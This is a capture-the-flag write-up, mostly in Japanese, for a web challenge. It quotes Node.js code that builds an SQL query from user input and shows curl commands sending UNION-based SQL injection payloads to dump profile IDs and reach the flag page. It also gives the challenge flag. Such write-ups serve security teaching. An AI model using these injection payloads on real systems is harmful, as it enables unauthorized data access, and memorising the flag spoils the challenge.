# game-leaderboard:web:XXXXpts
I (superandypancake) signed up for this tournament to win a flag! Unfortunately, I'm not so good. But I'm sure there still is a way to get the flag... right?!?  
[game-leaderboard.tjc.tf](https://game-leaderboard.tjc.tf/)  

Downloads  
[index.js](index.js)  

# Solution
ソースとサイトが渡される。  
アクセスすると、謎のリーダーボードがあり、フィルターで表示を変更できるようだ。  
[site.png](site/site.png)  
ソースは以下のようであった。  
```js
~~~
const FLAG = fs.readFileSync(`${__dirname}/flag.txt`).toString().trim()

const getLeaderboard = (minScore) => {
    const where = (typeof minScore !== 'undefined' && minScore !== '') ? ` WHERE score > ${minScore}` : ''
    const query = `SELECT profile_id, name, score FROM leaderboard${where} ORDER BY score DESC`
    const stmt = db.prepare(query)

    const leaderboard = []
    for (const row of stmt.iterate()) {
        if (leaderboard.length === 0) {
            leaderboard.push({ rank: 1, ...row })
            continue
        }
        const last = leaderboard[leaderboard.length - 1]
        const rank = (row.score == last.score) ? last.rank : last.rank + 1
        leaderboard.push({ rank, ...row })
    }

    return leaderboard
}
~~~
app.post('/', (req, res) => {
    const leaderboard = getLeaderboard(req.body.filter)
    return res.render('leaderboard', { leaderboard })
})

app.get('/user/:userID', (req, res) => {
    const leaderboard = getLeaderboard()
    const total = leaderboard.length

    const profile = leaderboard.find(x => x.profile_id == req.params.userID)
    if (typeof profile === 'undefined') {
        return res.render('user_info', { notFound: true })
    }

    const flag = (profile.rank === 1) ? FLAG : 'This is reserved for winners only!'
    return res.render('user_info', { total, flag, ...profile })
})
~~~
```
rankが1なユーザのページにflagがあるようだ。  
ただし、`https://game-leaderboard.tjc.tf/user/1`などは404であるので、ページ上の数値は`userID`ではないようだ。  
`getLeaderboard`に自明なSQLiがあるので以下のように、`userID`とされる`profile_id`を取得する。  
フロントで数値であるかの入力チェックをしているがcurlなので無視できる。  
```bash
$ curl -X POST https://game-leaderboard.tjc.tf/ -d "filter='"
~~~
<pre>Internal Server Error</pre>
~~~
$ curl -X POST https://game-leaderboard.tjc.tf/ -d "filter=0 UNION SELECT 1, 1, 1 ; -- satoki"
~~~
                        <tr>
                            <td>1</td>
                            <td>1</td>
                            <td class="text-center">1</td>
                        </tr>
~~~
$ curl -X POST https://game-leaderboard.tjc.tf/ -d "filter=0 UNION SELECT 1, 1, profile_id FROM leaderboard ; -- satoki"
~~~
                        <tr>
                            <td>1</td>
                            <td>1</td>
                            <td class="text-center">1e3ee1488d2d09fa</td>
                        </tr>

                        <tr>
                            <td>2</td>
                            <td>1</td>
                            <td class="text-center">2b7485706b1f7090</td>
                        </tr>

                        <tr>
                            <td>3</td>
                            <td>1</td>
                            <td class="text-center">6896e98c2e4584db</td>
                        </tr>

                        <tr>
                            <td>4</td>
                            <td>1</td>
                            <td class="text-center">a248cd0874717e51</td>
                        </tr>

                        <tr>
                            <td>5</td>
                            <td>1</td>
                            <td class="text-center">c35b9ef595b655a0</td>
                        </tr>
~~~
```
無事にuserIDを取得できた。  
あとはユーザのページにアクセスしてやればよい。  
flag  
[flag.png](site/flag.png)  
`https://game-leaderboard.tjc.tf/user/1e3ee1488d2d09fa`にflagが書かれていた。  

## tjctf{h3llo_w1nn3r_0r_4re_y0u?}